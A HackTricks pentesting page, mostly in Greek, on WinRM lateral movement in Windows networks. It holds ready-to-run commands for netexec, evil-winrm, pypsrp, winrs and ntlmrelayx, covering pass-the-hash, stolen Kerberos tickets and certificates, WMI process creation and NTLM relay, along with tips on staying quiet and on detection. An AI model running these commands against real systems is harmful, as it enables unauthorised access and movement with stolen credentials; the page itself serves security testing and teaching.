# WinRM

{{#include ../../banners/hacktricks-training.md}}

Το WinRM είναι ένα από τα πιο βολικά transports για **lateral movement** σε Windows περιβάλλοντα, επειδή σου δίνει ένα remote shell μέσω **WS-Man/HTTP(S)** χωρίς να χρειάζονται τεχνάσματα δημιουργίας SMB service. Αν ο στόχος εκθέτει **5985/5986** και το principal σου επιτρέπεται να χρησιμοποιήσει remoting, συχνά μπορείς να περάσεις από "valid creds" σε "interactive shell" πολύ γρήγορα.

Για **protocol/service enumeration**, listeners, enabling WinRM, `Invoke-Command`, και γενική χρήση client, δες:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Χρησιμοποιεί **HTTP/HTTPS** αντί για SMB/RPC, οπότε συχνά λειτουργεί εκεί όπου το PsExec-style execution μπλοκάρεται.
- Με **Kerberos**, αποφεύγει να στείλει reusable credentials στον στόχο.
- Λειτουργεί καθαρά από **Windows**, **Linux**, και **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Το interactive PowerShell remoting path εκκινεί το **`wsmprovhost.exe`** στον στόχο υπό το authenticated user context, κάτι που operationally είναι διαφορετικό από service-based exec.

## Access model and prerequisites

Στην πράξη, το επιτυχές WinRM lateral movement εξαρτάται από **τρία** πράγματα:

1. Ο στόχος έχει ένα **WinRM listener** (`5985`/`5986`) και firewall rules που επιτρέπουν πρόσβαση.
2. Ο λογαριασμός μπορεί να **authenticate** στο endpoint.
3. Ο λογαριασμός επιτρέπεται να **open a remoting session**.

Κοινοί τρόποι για να αποκτήσεις αυτήν την πρόσβαση:

- **Local Administrator** στον στόχο.
- Membership σε **Remote Management Users** σε νεότερα συστήματα ή **WinRMRemoteWMIUsers__** σε συστήματα/components που ακόμα τιμούν αυτό το group.
- Explicit remoting rights που έχουν δοθεί μέσω local security descriptors / PowerShell remoting ACL changes.

Αν ήδη ελέγχεις ένα box με admin rights, θυμήσου ότι μπορείς επίσης να **delegate WinRM access without full admin group membership** χρησιμοποιώντας τις τεχνικές που περιγράφονται εδώ:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- Το **Kerberos requires a hostname/FQDN**. Αν συνδεθείς με IP, ο client συνήθως κάνει fallback σε **NTLM/Negotiate**.
- Σε **workgroup** ή cross-trust edge cases, το NTLM συνήθως απαιτεί είτε **HTTPS** είτε ο στόχος να προστεθεί στα **TrustedHosts** στον client.
- Με **local accounts** μέσω Negotiate σε workgroup, τα UAC remote restrictions μπορεί να εμποδίσουν την πρόσβαση εκτός αν χρησιμοποιηθεί ο built-in Administrator account ή `LocalAccountTokenFilterPolicy=1`.
- Το PowerShell remoting κάνει default στο **`HTTP/<host>` SPN**. Σε περιβάλλοντα όπου το **`HTTP/<host>`** είναι ήδη registered σε κάποιο άλλο service account, το WinRM Kerberos μπορεί να αποτύχει με `0x80090322`; χρησιμοποίησε a port-qualified SPN ή γύρνα σε **`WSMAN/<host>`** όπου υπάρχει αυτό το SPN.

Αν αποκτήσεις valid credentials κατά το password spraying, το να τα validate-άρεις μέσω WinRM είναι συχνά ο πιο γρήγορος τρόπος να ελέγξεις αν μεταφράζονται σε shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM for interactive shells

Το `evil-winrm` παραμένει η πιο βολική διαδραστική επιλογή από Linux, επειδή υποστηρίζει **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, μεταφορά αρχείων και φόρτωση PowerShell/.NET στη μνήμη.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Όταν το προεπιλεγμένο **`HTTP/<host>`** SPN προκαλεί αποτυχίες Kerberos, δοκιμάστε να ζητήσετε/χρησιμοποιήσετε αντί αυτού ένα ticket **`WSMAN/<host>`**. Αυτό εμφανίζεται σε hardened ή περίεργα enterprise setups όπου το **`HTTP/<host>`** είναι ήδη συνδεδεμένο σε άλλο service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Αυτό είναι επίσης χρήσιμο μετά από κατάχρηση **RBCD / S4U** όταν συγκεκριμένα παραποίησες ή ζήτησες ένα **WSMAN** service ticket αντί για ένα γενικό `HTTP` ticket.

### Πιστοποίηση βάσει certificate

Το WinRM υποστηρίζει επίσης **client certificate authentication**, αλλά το certificate πρέπει να είναι mapped στον στόχο σε έναν **local account**. Από offensive οπτική, αυτό έχει σημασία όταν:

- έκλεψες/exported ένα έγκυρο client certificate και private key που είναι ήδη mapped για WinRM;
- κατάχρησες το **AD CS / Pass-the-Certificate** για να αποκτήσεις ένα certificate για έναν principal και μετά να pivot σε άλλο authentication path;
- λειτουργείς σε περιβάλλοντα που αποφεύγουν σκόπιμα το password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM είναι πολύ λιγότερο συνηθισμένο από password/hash/Kerberos auth, αλλά όταν υπάρχει μπορεί να προσφέρει μια **passwordless lateral movement** διαδρομή που επιβιώνει από password rotation.

### Python / automation with `pypsrp`

Αν χρειάζεσαι automation αντί για operator shell, το `pypsrp` σου δίνει WinRM/PSRP από Python με υποστήριξη για **NTLM**, **certificate auth**, **Kerberos**, και **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Αν χρειάζεσαι πιο λεπτομερή έλεγχο από το υψηλού επιπέδου wrapper `Client`, τα χαμηλότερου επιπέδου APIs `WSMan` + `RunspacePool` είναι χρήσιμα για δύο κοινά operator problems:

- forcing **`WSMAN`** ως το Kerberos service/SPN αντί για το προεπιλεγμένο `HTTP` expectation που χρησιμοποιούν πολλά PowerShell clients;
- connecting to a **non-default PSRP endpoint** όπως ένα **JEA** / custom session configuration αντί για `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Τα custom PSRP endpoints και το JEA έχουν σημασία κατά το lateral movement

Ένας επιτυχής WinRM authentication **δεν** σημαίνει πάντα ότι καταλήγεις στο default unrestricted `Microsoft.PowerShell` endpoint. Mature environments μπορεί να εκθέτουν **custom session configurations** ή **JEA** endpoints με τα δικά τους ACLs και run-as behavior.

Αν έχεις ήδη code execution σε ένα Windows host και θέλεις να καταλάβεις ποια remoting surfaces υπάρχουν, απαρίθμησε τα registered endpoints:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Όταν υπάρχει ένα χρήσιμο endpoint, στόχευσέ το ρητά αντί για το default shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Practical offensive implications:

- Ένα **restricted** endpoint μπορεί ακόμα να είναι αρκετό για lateral movement αν εκθέτει ακριβώς τα κατάλληλα cmdlets/functions για έλεγχο υπηρεσιών, πρόσβαση σε αρχεία, δημιουργία διεργασιών ή αυθαίρετη εκτέλεση .NET / external command.
- Ένα **misconfigured JEA** role είναι ιδιαίτερα πολύτιμο όταν εκθέτει επικίνδυνες εντολές όπως `Start-Process`, ευρεία wildcards, writable providers ή custom proxy functions που σου επιτρέπουν να ξεφύγεις από τους προβλεπόμενους περιορισμούς.
- Endpoints που υποστηρίζονται από **RunAs virtual accounts** ή **gMSAs** αλλάζουν το effective security context των εντολών που εκτελείς. Συγκεκριμένα, ένα gMSA-backed endpoint μπορεί να παρέχει **network identity on the second hop** ακόμα και όταν ένα κανονικό WinRM session θα συναντούσε το κλασικό delegation problem.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` είναι built in και χρήσιμο όταν θέλεις **native WinRM command execution** χωρίς να ανοίξεις ένα interactive PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Δύο flags είναι εύκολο να τα ξεχάσεις και έχουν σημασία στην πράξη:

- Το `/noprofile` απαιτείται συχνά όταν το remote principal **δεν** είναι τοπικός administrator.
- Το `/allowdelegate` επιτρέπει στο remote shell να χρησιμοποιήσει τα credentials σου εναντίον ενός **τρίτου host** (για παράδειγμα, όταν η εντολή χρειάζεται `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operationally, το `winrs.exe` συνήθως καταλήγει σε μια απομακρυσμένη αλυσίδα διεργασιών παρόμοια με:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Αξίζει να το θυμάστε γιατί διαφέρει από service-based exec και από interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM αντί για PowerShell remoting

Μπορείτε επίσης να εκτελέσετε μέσω **WinRM transport** χωρίς `Enter-PSSession` επικαλούμενοι WMI classes over WS-Man. Αυτό διατηρεί το transport ως WinRM ενώ το remote execution primitive γίνεται **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Αυτή η προσέγγιση είναι χρήσιμη όταν:

- Το PowerShell logging παρακολουθείται έντονα.
- Θέλεις **WinRM transport** αλλά όχι ένα κλασικό PS remoting workflow.
- Χτίζεις ή χρησιμοποιείς custom tooling γύρω από το **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Όταν το SMB relay μπλοκάρεται από signing και το LDAP relay είναι περιορισμένο, το **WS-Man/WinRM** μπορεί ακόμα να είναι ένας ελκυστικός στόχος relay. Το σύγχρονο `ntlmrelayx.py` περιλαμβάνει **WinRM relay servers** και μπορεί να κάνει relay σε targets **`wsman://`** ή **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Δύο πρακτικές σημειώσεις:

- Το Relay είναι πιο χρήσιμο όταν ο στόχος δέχεται **NTLM** και το relayed principal επιτρέπεται να χρησιμοποιήσει WinRM.
- Ο πρόσφατος κώδικας του Impacket χειρίζεται συγκεκριμένα αιτήματα **`WSMANIDENTIFY: unauthenticated`**, ώστε τα probes τύπου `Test-WSMan` να μην σπάνε τη ροή του relay.

Για multi-hop περιορισμούς μετά την είσοδο σε μια πρώτη συνεδρία WinRM, έλεγξε:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC και σημειώσεις ανίχνευσης

- Το **interactive PowerShell remoting** συνήθως δημιουργεί **`wsmprovhost.exe`** στον στόχο.
- Το **`winrs.exe`** συνήθως δημιουργεί **`winrshost.exe`** και μετά το ζητούμενο child process.
- Τα custom **JEA** endpoints μπορεί να εκτελούν ενέργειες ως **WinRM_VA_*** virtual accounts ή ως ένα ρυθμισμένο **gMSA**, κάτι που αλλάζει τόσο το telemetry όσο και τη συμπεριφορά του δεύτερου hop σε σύγκριση με ένα κανονικό shell σε user-context.
- Να περιμένεις telemetry **network logon**, events της υπηρεσίας WinRM και PowerShell operational/script-block logging αν χρησιμοποιείς PSRP αντί για raw `cmd.exe`.
- Αν χρειάζεσαι μόνο μία εντολή, το `winrs.exe` ή η one-shot εκτέλεση μέσω WinRM μπορεί να είναι πιο αθόρυβα από μια μακρόβια interactive remoting συνεδρία.
- Αν το Kerberos είναι διαθέσιμο, προτίμησε **FQDN + Kerberos** αντί για IP + NTLM για να μειώσεις τόσο τα trust issues όσο και τις άβολες αλλαγές στο `TrustedHosts` από την πλευρά του client.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
